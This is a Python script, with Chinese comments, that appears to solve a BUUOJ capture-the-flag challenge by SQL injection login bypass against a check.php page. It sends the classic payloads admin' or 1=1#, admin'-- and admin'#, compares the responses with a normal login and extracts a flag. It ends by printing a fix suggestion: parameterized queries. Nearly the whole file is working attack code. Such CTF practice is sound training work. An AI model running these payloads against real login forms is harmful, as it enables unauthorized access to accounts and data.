#!/usr/bin/env python3
"""
CTF挑战解决方案：万能密码注入
目标：http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81/check.php
"""

import asyncio
import aiohttp
import re
from typing import Dict, Any


class CTFSolver:
    """CTF挑战求解器"""
    
    def __init__(self):
        self.session = None
        self.target_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81/check.php"
    
    async def initialize(self):
        """初始化"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close(self):
        """关闭"""
        if self.session:
            await self.session.close()
    
    def detect_flag(self, text: str) -> str:
        """从文本中检测flag"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group()
        
        return None
    
    async def test_normal_request(self) -> Dict[str, Any]:
        """测试正常请求"""
        print("1. 测试正常请求...")
        params = {"username": "admin", "password": "test"}
        
        async with self.session.get(self.target_url, params=params) as response:
            text = await response.text()
            
        return {
            "status": response.status,
            "length": len(text),
            "has_error": "NO,Wrong username password" in text,
            "preview": text[:200] if len(text) > 200 else text
        }
    
    async def test_universal_password(self) -> Dict[str, Any]:
        """测试万能密码"""
        print("2. 测试万能密码注入...")
        
        # 有效的payload
        payloads = [
            {"username": "admin' or 1=1#", "password": ""},
            {"username": "admin'--", "password": ""},
            {"username": "admin'#", "password": ""},
        ]
        
        results = []
        
        for payload in payloads:
            async with self.session.get(self.target_url, params=payload) as response:
                text = await response.text()
                flag = self.detect_flag(text)
                
                result = {
                    "payload": payload,
                    "status": response.status,
                    "length": len(text),
                    "has_error": "NO,Wrong username password" in text,
                    "flag_found": flag is not None,
                    "flag": flag,
                    "preview": text[:200] if len(text) > 200 else text
                }
                
                results.append(result)
                
                if flag:
                    print(f"  发现flag: {flag}")
                    return result
        
        return results[0] if results else None
    
    async def analyze_difference(self) -> Dict[str, Any]:
        """分析响应差异"""
        print("3. 分析响应差异...")
        
        # 正常请求
        normal_params = {"username": "admin", "password": "test"}
        async with self.session.get(self.target_url, params=normal_params) as response:
            normal_text = await response.text()
        
        # 万能密码请求
        exploit_params = {"username": "admin' or 1=1#", "password": ""}
        async with self.session.get(self.target_url, params=exploit_params) as response:
            exploit_text = await response.text()
        
        # 分析差异
        normal_has_error = "NO,Wrong username password" in normal_text
        exploit_has_error = "NO,Wrong username password" in exploit_text
        
        # 查找flag
        flag = self.detect_flag(exploit_text)
        
        return {
            "normal_has_error": normal_has_error,
            "exploit_has_error": exploit_has_error,
            "error_disappeared": normal_has_error and not exploit_has_error,
            "flag_found": flag is not None,
            "flag": flag,
            "normal_length": len(normal_text),
            "exploit_length": len(exploit_text),
            "length_difference": len(exploit_text) - len(normal_text)
        }
    
    async def solve(self) -> Dict[str, Any]:
        """解决CTF挑战"""
        print("="*60)
        print("CTF挑战解决方案：万能密码注入")
        print(f"目标: {self.target_url}")
        print("="*60)
        
        await self.initialize()
        
        try:
            # 步骤1：测试正常请求
            normal_result = await self.test_normal_request()
            print(f"   状态码: {normal_result['status']}")
            print(f"   响应长度: {normal_result['length']}")
            print(f"   包含错误消息: {normal_result['has_error']}")
            
            # 步骤2：测试万能密码
            exploit_result = await self.test_universal_password()
            print(f"   状态码: {exploit_result['status']}")
            print(f"   响应长度: {exploit_result['length']}")
            print(f"   包含错误消息: {exploit_result['has_error']}")
            print(f"   找到flag: {exploit_result['flag_found']}")
            
            # 步骤3：分析差异
            analysis = await self.analyze_difference()
            print(f"   错误消息消失: {analysis['error_disappeared']}")
            print(f"   长度差异: {analysis['length_difference']}")
            
            # 总结
            print("\n" + "="*60)
            print("总结:")
            print("="*60)
            
            if exploit_result['flag_found']:
                print(f"🎉 成功获取flag: {exploit_result['flag']}")
                print("\n漏洞类型: SQL注入（万能密码）")
                print("漏洞位置: check.php登录验证")
                print("利用方法: 在用户名字段注入 ' or 1=1#")
                print("修复建议: 使用参数化查询或预处理语句")
                
                return {
                    "success": True,
                    "flag": exploit_result['flag'],
                    "vulnerability": "SQL Injection (Universal Password)",
                    "exploit": "username=admin' or 1=1#",
                    "details": {
                        "normal_response": normal_result,
                        "exploit_response": exploit_result,
                        "analysis": analysis
                    }
                }
            else:
                print("❌ 未找到flag")
                return {
                    "success": False,
                    "flag": None,
                    "details": {
                        "normal_response": normal_result,
                        "exploit_response": exploit_result,
                        "analysis": analysis
                    }
                }
                
        finally:
            await self.close()


async def main():
    """主函数"""
    solver = CTFSolver()
    result = await solver.solve()
    
    # 保存结果到文件
    import json
    with open("ctf_solution_result.json", "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    
    print(f"\n结果已保存到: ctf_solution_result.json")
    
    return 0 if result["success"] else 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)